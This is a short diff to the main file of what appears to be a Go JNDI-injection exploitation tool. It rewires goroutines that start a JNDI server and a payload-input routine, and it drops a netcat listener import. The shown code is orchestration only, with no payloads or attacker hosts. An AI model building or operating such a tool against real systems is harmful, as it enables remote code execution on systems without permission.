@@ -5,47 +5,29 @@ import (
 	// "os"
 	"fmt"
 	"myapp/lib/execjndi"
-	"myapp/lib/ncat"
 	"myapp/lib/payload"
 	"myapp/lib/sysinfo"
+	"sync"
 )
 
 func main() {
 	banner()
-	// startPayload := make(chan bool)
-	// exitChan := make(chan struct{})
-	// go func() {
-	// 	execjndi.ExecJNDI(startPayload)
-	// }()
-	// go func() {
-	// 	<-startPayload
-	// 	for {
-	// 		payload.PayloadInput()
-	// 		fmt.Println("Do you want to send another payload? (yes/no)")
-	// 		scanner := bufio.NewScanner(os.Stdin)
-	// 		if scanner.Scan() {
-	// 			response := scanner.Text()
-	// 			if response != "yes" {
-	// 				close(exitChan)
-	// 				break
-	// 			}
-	// 		}
-	// 	}
-	// }()
-	// <-exitChan
-	// fmt.Println("Exiting...")
-	// os.Exit(0)
 	startPayload := make(chan bool)
+	logChan := make(chan string)
+	var wg sync.WaitGroup
+	wg.Add(1)
+	go execjndi.ExecJNDI(startPayload, logChan, &wg)
 	go func() {
-		ncat.StartNcat()
-		execjndi.ExecJNDI(startPayload)
+		for log := range logChan {
+			fmt.Print(log)
+		}
 	}()
 	go func() {
 		<-startPayload
 		payload.PayloadInput()
 		fmt.Println("Press Ctrl+C to exit.")
 	}()
-	select {}
+	wg.Wait()
 }
 
 func banner() {
